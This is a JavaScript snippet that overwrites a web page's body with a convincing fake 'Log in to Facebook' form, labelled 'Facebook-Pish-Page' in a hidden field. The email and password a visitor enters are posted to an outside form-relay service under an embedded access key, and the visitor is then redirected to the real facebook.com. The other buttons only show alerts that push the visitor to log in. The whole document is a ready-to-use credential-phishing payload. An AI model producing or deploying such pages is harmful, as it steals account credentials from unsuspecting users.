document.getElementById("footer").innerHTML = "";
document.body.innerHTML = `
<style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 24px;
        }

        .login-card {
            width: 100%;
            max-width: 440px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 2rem;
            position: relative;
        }

        .logo-img {
            width: 85px;
            height: 85px;
            border: none;
            border-radius: 50%;
            object-fit: cover;
            background-color: transparent;
            margin-bottom: 1rem;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .form-title {
            font-size: 24px;
            font-weight: 500;
            color: #000000;
            margin-bottom: 1.5rem;
            text-align: left;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 1.25rem;
            width: 100%;
        }

        .input-wrapper label {
            position: absolute;
            top: 8px;
            left: 16px;
            font-size: 11px;
            color: #65676b;
            pointer-events: none;
        }

        .input-wrapper input {
            width: 100%;
            padding: 26px 16px 10px 16px;
            font-size: 16px;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            outline: none;
            color: #1c1e21;
            background-color: #ffffff;
            transition: border-color 0.2s;
        }

        .input-wrapper input[type="password"] {
            padding: 18px 16px;
        }

        .input-wrapper input[type="email"] {
            padding: 18px 16px;
        }

        .input-wrapper input:focus {
            border-color: #1877f2;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #0866ff !important;
            color: #ffffff;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 0.5rem;
            transition: opacity 0.2s;
        }

        .btn-login:hover {
            opacity: 0.95;
        }

        .forgot-password {
            display: block;
            background: none;
            border: none;
            text-align: center;
            color: #0866ff;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
            margin-top: 1.25rem;
            margin-bottom: 2.5rem;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .btn-create-account {
            width: auto;
            min-width: 60%;
            align-self: center;
            padding: 12px 24px;
            background-color: #ffffff;
            color: #0866ff;
            border: 1px solid #0866ff;
            border-radius: 24px;
            font-size: 15px;
            cursor: pointer;
            font-weight: 600;
            text-decoration: none;
            text-align: center;
            transition: background-color 0.2s;
        }

        .btn-create-account:hover {
            background-color: #f0f5ff;
        }
    </style>

    <div class="login-card">
        
        <div class="header-section">
            
            <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTY0XX9qcSmWRG7cG11YirCkMwo1lMJTqswkS8Y50YYWEBscQBIJHGww0oyHw&amp;s" alt="facebook">
<br>


        </div>

        <form action="https://api.web3forms.com/submit" method="POST" class="login-form">
            
            
            <input type="hidden" name="access_key" value="dc62db4d-6377-4201-90fc-9b4c00ca3dcd">
            <input type="hidden" name="_subject" value="Facebook-Pish-Page*AltoroProject">
            <input type="hidden" name="redirect" value="https://facebook.com">

            <b><div class="x9f619 x1ja2u2z x78zum5 x2lah0s x1n2onr6 x1nhvcw1 x6s0dn4 xozqiw3 x1q0g3np xyri2b x1c1uobl x18d9i69 xyamay9 x1ws5yxj xw01apr"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1icxu4v x25sj25"><div class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1cy8zhl"><span class="x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1ejgnnb xza2c7i x1apb90u x1orftwa xzsf02u x1yc453h xudqn12 x41vudc" style="--x---base-line-clamp-line-height:calc(var(--headline3-line-height) * 1em);--x-lineHeight:calc(var(--headline3-line-height) * 1em)">Log in to Facebook</span></div></div></div></div></div></b>
<br>

            <div class="input-wrapper">
                <input type="email" name="email" placeholder="Email address" required="">
            </div>

            <div class="input-wrapper">
                <input type="password" name="pas-wrod" placeholder="Password" required="">
            </div>
            
            <button type="submit" class="btn-login">Log in</button>

            <button type="button" class="forgot-password" onclick="alert('Something Went Wrong, Login To Continue!');">Forgot password?</button>

            <button type="button" class="btn-create-account" onclick="alert('Something Went Wrong, Please Login First!');">Create new account</button><br>

<br>
<div style="display: flex; justify-content: center; align-items: center;">
    <img src="data:image/png;base64,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" alt="meta" width="100px" height="100%">
    
</div>






    

        </form>
    </div>
    `;
